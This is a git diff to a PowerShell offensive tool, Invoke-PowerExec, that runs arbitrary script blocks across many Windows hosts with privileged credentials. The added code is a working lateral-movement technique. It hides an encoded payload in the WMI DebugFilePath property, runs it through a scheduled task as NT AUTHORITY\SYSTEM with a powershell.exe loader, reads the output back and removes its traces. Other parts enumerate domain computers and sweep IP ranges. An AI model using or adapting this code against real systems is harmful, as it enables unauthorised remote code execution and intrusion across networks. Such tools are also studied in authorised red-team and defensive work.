@@ -6,7 +6,7 @@ function Invoke-PowerExec {
     Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    Invoke-PowerExec runs PowerShell script block on remote computers through various techniques.
+    Invoke-PowerExec runs PowerShell script block on remote computers through various methods.
     Multi-threading part is mostly stolen from PowerView by @harmj0y and @mattifestation.
 
 .PARAMETER ScriptBlock
@@ -21,22 +21,22 @@ function Invoke-PowerExec {
 .PARAMETER Credential
     Specifies the privileged account to use.
 
-.PARAMETER Protocol
-    Specifies the execution technique to use, defaults to WinRM.
+.PARAMETER Method
+    Specifies the execution method to use, defaults to WMI.
 
 .PARAMETER Threads
     Specifies the number of threads to use, defaults to 5.
 
 .EXAMPLE
-    PS C:\> Invoke-PowerExec -ScriptBlock {Write-Output "$Env:COMPUTERNAME ($Env:USERDOMAIN\$Env:USERNAME)"} -ComputerList $(gc hosts.txt) -Protocol WinRM
+    PS C:\> Invoke-PowerExec -ScriptBlock {Write-Output "$Env:COMPUTERNAME ($Env:USERDOMAIN\$Env:USERNAME)"} -ComputerList $(gc hosts.txt)
 
 .EXAMPLE
-    PS C:\> Get-PowerLoader -FilePath .\script.ps1 | Invoke-PowerExec -DomainComputers ADATUM.CORP -Credential ADATUM\Administrator -Protocol WMI -Threads 10
+    PS C:\> New-PowerLoader -FilePath .\script.ps1 | Invoke-PowerExec -DomainComputers ADATUM.CORP -Credential ADATUM\Administrator -Method WinRM -Threads 10
 #>
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [Management.Automation.ScriptBlock]
+        [ScriptBlock]
         $ScriptBlock,
 
         [ValidateNotNullOrEmpty()]
@@ -52,16 +52,16 @@ function Invoke-PowerExec {
         [Management.Automation.Credential()]
         $Credential = [Management.Automation.PSCredential]::Empty,
 
-        [ValidateSet('WinRM', 'WMI')]
+        [ValidateSet('SchTask', 'WinRM', 'WMI')]
         [String]
-        $Protocol = 'WinRM',
+        $Method = 'WMI',
 
         [ValidateNotNullOrEmpty()]
         [Int]
         $Threads = 5
     )
 
-    $hostList = New-Object System.Collections.ArrayList
+    $hostList = New-Object Collections.ArrayList
 
     foreach ($computer in $ComputerList) {
         if ($computer.contains("/")) {
@@ -74,7 +74,7 @@ function Invoke-PowerExec {
 
     if ($DomainComputers) {
         $searchString = "LDAP://$DomainComputers/RootDSE"
-        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
+        $domainObject = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
         $rootDN = $domainObject.rootDomainNamingContext[0]
         $ADSpath = "LDAP://$DomainComputers/$rootDN"
         $filter = "(&(samAccountType=805306369)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
@@ -88,14 +88,14 @@ function Invoke-PowerExec {
 
     if ($Threads -eq 1 -or $hostList.Count -eq 1) {
         foreach ($computer in $hostList) {
-            New-PowerExec -ScriptBlock $ScriptBlock -ComputerName $computer -Credential $Credential -Protocol $Protocol
+            New-PowerExec -ScriptBlock $ScriptBlock -ComputerName $computer -Credential $Credential -Method $Method
         }
     }
     else {
         $parameters = @{
             ScriptBlock = $ScriptBlock
             Credential = $Credential
-            Protocol = $Protocol
+            Method = $Method
             Verbose = $VerbosePreference
         }
         New-ThreadedFunction -ScriptBlock ${function:New-PowerExec} -ScriptParameters $parameters -Collection $hostList -CollectionParameter 'ComputerName' -Threads $Threads
@@ -111,36 +111,36 @@ function Local:New-IPv4RangeFromCIDR {
         $CIDR
     )
 
-    $hostList = New-Object System.Collections.ArrayList
+    $hostList = New-Object Collections.ArrayList
     $netPart = $CIDR.split("/")[0]
     [uint32]$maskPart = $CIDR.split("/")[1]
 
-    $address = [System.Net.IPAddress]::Parse($netPart)
+    $address = [Net.IPAddress]::Parse($netPart)
     if ($maskPart -ge $address.GetAddressBytes().Length * 8) {
         throw "Bad host mask"
     }
 
-    $numhosts = [System.math]::Pow(2, (($address.GetAddressBytes().Length * 8) - $maskPart))
+    $numhosts = [Math]::Pow(2, (($address.GetAddressBytes().Length * 8) - $maskPart))
 
     $startaddress = $address.GetAddressBytes()
     [array]::Reverse($startaddress)
 
-    $startaddress = [System.BitConverter]::ToUInt32($startaddress, 0)
-    [uint32]$startMask = ([System.math]::Pow(2, $maskPart) - 1) * ([System.Math]::Pow(2, (32 - $maskPart)))
+    $startaddress = [BitConverter]::ToUInt32($startaddress, 0)
+    [uint32]$startMask = ([Math]::Pow(2, $maskPart) - 1) * ([Math]::Pow(2, (32 - $maskPart)))
     $startAddress = $startAddress -band $startMask
     # In powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary
-    $startAddress = [System.BitConverter]::GetBytes($startaddress)[0..3]
+    $startAddress = [BitConverter]::GetBytes($startaddress)[0..3]
     [array]::Reverse($startaddress)
-    $address = [System.Net.IPAddress][byte[]]$startAddress
+    $address = [Net.IPAddress][byte[]]$startAddress
 
     for ($i = 0; $i -lt $numhosts - 2; $i++) {
         $nextAddress = $address.GetAddressBytes()
         [array]::Reverse($nextAddress)
-        $nextAddress = [System.BitConverter]::ToUInt32($nextAddress, 0)
+        $nextAddress = [BitConverter]::ToUInt32($nextAddress, 0)
         $nextAddress++
-        $nextAddress = [System.BitConverter]::GetBytes($nextAddress)[0..3]
+        $nextAddress = [BitConverter]::GetBytes($nextAddress)[0..3]
         [array]::Reverse($nextAddress)
-        $address = [System.Net.IPAddress][byte[]]$nextAddress
+        $address = [Net.IPAddress][byte[]]$nextAddress
         $hostList.Add($address.IPAddressToString) | Out-Null
     }
     return $hostList
@@ -170,17 +170,17 @@ function Local:Get-LdapObject {
         $PageSize = 200,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
 
     if ($Credential.UserName) {
-        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
+        $domainObject = New-Object DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+        $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
     }
     else {
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
+        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
     }
     $searcher.SearchScope = $SearchScope
     $searcher.PageSize = $PageSize
@@ -225,7 +225,7 @@ function Local:New-ThreadedFunction {
         $CollectionParameter = 'ComputerName',
 
         [Parameter(Mandatory = $True)]
-        [System.Management.Automation.ScriptBlock]
+        [ScriptBlock]
         $ScriptBlock,
 
         [Hashtable]
@@ -240,10 +240,10 @@ function Local:New-ThreadedFunction {
     )
 
     BEGIN {
-        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
 
         # Force a single-threaded apartment state (for token-impersonation stuffz)
-        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA
+        $SessionState.ApartmentState = [Threading.ApartmentState]::STA
 
         # Import the current session state's variables and functions so the chained functionality can be used by the threaded blocks
         if (-not $NoImports) {
@@ -256,13 +256,13 @@ function Local:New-ThreadedFunction {
             # Add variables from Parent Scope (current runspace) into the InitialSessionState
             foreach ($Var in $MyVars) {
                 if ($VorbiddenVars -NotContains $Var.Name) {
-                    $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+                    $SessionState.Variables.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                 }
             }
 
             # Add functions from current runspace to the InitialSessionState
             foreach ($Function in (Get-ChildItem Function:)) {
-                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
+                $SessionState.Commands.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
             }
         }
 
@@ -321,7 +321,7 @@ function Local:New-ThreadedFunction {
         }
         while (($Jobs | Where-Object {-not $_.Result.IsCompleted}).Count -gt 0)
 
-        $SleepSeconds = 10
+        $SleepSeconds = 100
         Write-Verbose "[THREAD] Waiting $SleepSeconds seconds for final cleanup..."
 
         # Cleanup
@@ -341,7 +341,7 @@ function Local:New-ThreadedFunction {
 function Local:New-PowerExec {
     Param (
         [Parameter(Mandatory = $True)]
-        [Management.Automation.ScriptBlock]
+        [ScriptBlock]
         $ScriptBlock,
 
         [Parameter(Mandatory = $True)]
@@ -354,13 +354,13 @@ function Local:New-PowerExec {
         [Management.Automation.Credential()]
         $Credential = [Management.Automation.PSCredential]::Empty,
 
-        [ValidateSet('WinRM', 'WMI')]
+        [ValidateSet('SchTask', 'WinRM', 'WMI')]
         [String]
-        $Protocol = 'WinRM'
+        $Method = 'WMI'
     )
 
     $output = $null
-    switch ($Protocol) {
+    switch ($Method) {
         'WinRM' {
             try {
                 $output = Invoke-Command -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -ErrorAction Stop
@@ -386,6 +386,28 @@ function Local:New-PowerExec {
         'WMI' {
             try {
                 $output = Invoke-WmiExec -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            }
+            catch [Runtime.InteropServices.COMException] {
+                Write-Verbose "[$ComputerName] RPC server is unavailable."
+            }
+            catch [UnauthorizedAccessException] {
+                Write-Verbose "[$ComputerName] Access is denied."
+            }
+            catch [Management.Automation.MethodInvocationException] {
+                Write-Verbose "[$ComputerName] Insufficient rights."
+            }
+            catch [Management.Automation.RuntimeException] {
+                if($Error[0].FullyQualifiedErrorId -eq 'InvokeMethodOnNull') {
+                    Write-Verbose "[$ComputerName] DNS resolution failed."
+                }
+                else {
+                    Write-Warning "[$ComputerName] Execution failed. $_"
+                }
+            }
+        }
+        'SchTask' {
+            try {
+                $output = Invoke-SchTaskExec -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
             }
             catch [Runtime.InteropServices.COMException] {
                 Write-Verbose "[$ComputerName] RPC server is unavailable."
@@ -435,10 +457,9 @@ function Local:Invoke-WMIExec {
             $originalProperty = $originalObject.DebugFilePath
             Write-Verbose "[WMIEXEC] Encoding payload into WMI property DebugFilePath"
             $script = ''
-            $script += '[ScriptBlock] $ScriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
-            $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $ScriptBlock *>&1))' + [Environment]::NewLine
-            #$script += 'if (-not $output) { $output = [Management.Automation.PSSerializer]::Serialize(("No output.")) }' + [Environment]::NewLine
-            $script += '$encOutput = [Int[]][Char[]]$output.Trim() -Join '',''' + [Environment]::NewLine
+            $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
+            $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
+            $script += '$encOutput = [Int[]][Char[]]$output -Join '',''' + [Environment]::NewLine
             $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
             $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
             $script += '$x.Put()'
@@ -470,10 +491,116 @@ function Local:Invoke-WMIExec {
         Write-Verbose "[WMIEXEC] Getting output from WMI property DebugFilePath"
         $modifiedObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
         $output = [char[]][int[]]$modifiedObject.DebugFilePath.Split(',') -Join ''
-        Write-Output ([System.Management.Automation.PSSerializer]::Deserialize($output))
+        try {
+            Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
+        }
+        catch [Management.Automation.MethodInvocationException] {
+            Write-Warning "[$ComputerName] Failed to retrieve output."
+        }
+        finally {
+            Write-Verbose "[WMIEXEC] Restoring original WMI property value: $originalProperty"
+            $modifiedObject.DebugFilePath = $originalProperty
+            $modifiedObject.Put() | Out-Null
+        }
+    }
+}
 
-        Write-Verbose "[WMIEXEC] Restoring original WMI property value: $originalProperty"
-        $modifiedObject.DebugFilePath = $originalProperty
-        $modifiedObject.Put() | Out-Null
+function Local:Invoke-SchTaskExec {
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerName = $env:COMPUTERNAME,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateSet('Dcom', 'Wsman')]
+        [String]
+        $Protocol = 'Dcom'
+    )
+
+    BEGIN {
+        $cimOption = New-CimSessionOption -Protocol $Protocol
+        try {
+            if ($Credential.Username) {
+                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+            }
+            else {
+                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+            }
+        }
+        catch [Microsoft.Management.Infrastructure.CimException] {
+            Write-Verbose "[$ComputerName] Failed to establish CIM session."
+            break
+        }
+
+        try {
+            $originalObject = Get-CimInstance -Class Win32_OSRecoveryConfiguration -CimSession $cimSession -ErrorAction Stop -Verbose:$false
+            $originalProperty = $originalObject.DebugFilePath
+            Write-Verbose "[SCHTASKEXEC] Encoding payload into WMI property DebugFilePath"
+            $script = ''
+            $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
+            $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
+            $script += '$encOutput = [Int[]][Char[]]$output -Join '',''' + [Environment]::NewLine
+            $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
+            $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
+            $script += '$x.Put()'
+            $encScript = [Int[]][Char[]]$script -Join ','
+            $originalObject.DebugFilePath = $encScript
+            $originalObject | Set-CimInstance -Verbose:$false
+        }
+        catch {
+            throw $_
+        }
+    }
+    PROCESS {
+        $loader = ''
+        $loader += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration; '
+        $loader += '$y = [char[]][int[]]$x.DebugFilePath.Split('','') -Join ''''; '
+        $loader += '$z = [ScriptBlock]::Create($y); '
+        $loader += '& $z'
+        $arguments = '-NoP -NonI -C "' + $loader + '"'
+        Write-Verbose "[SCHTASKEXEC] Running command: powershell.exe $arguments"
+        $taskParameters = @{
+            TaskName = [guid]::NewGuid().Guid
+            Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell.exe" -Argument $arguments
+            Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $cimSession
+        }
+        $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $cimSession -ErrorAction Stop
+        $cimJob = $scheduledTask | Start-ScheduledTask -AsJob -ErrorAction Stop
+        $cimJob | Wait-Job | Remove-Job -Force -Confirm:$False
+        while (($scheduledTaskInfo = $scheduledTask | Get-ScheduledTaskInfo).LastTaskResult -eq 267009) { Start-Sleep -Milliseconds 200 }
+
+        if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) { 
+            Write-Warning "[$ComputerName] Failed to execute scheduled task."
+        }
+    }
+    END {
+        Write-Verbose "[SCHTASKEXEC] Unregistering scheduled task $($taskParameters.TaskName)"
+        $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask | Out-Null
+
+        Write-Verbose "[SCHTASKEXEC] Getting output from WMI property DebugFilePath"
+        $modifiedObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
+        $output = [char[]][int[]]$modifiedObject.DebugFilePath.Split(',') -Join ''
+        try {
+            Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
+        }
+        catch [Management.Automation.MethodInvocationException] {
+            Write-Warning "[$ComputerName] Failed to retrieve output."
+        }
+        finally {
+            Write-Verbose "[SCHTASKEXEC] Restoring original WMI property value: $originalProperty"
+            $modifiedObject.DebugFilePath = $originalProperty
+            $modifiedObject | Set-CimInstance -Verbose:$false
+
+            Remove-CimSession -CimSession $cimSession
+        }
     }
 }
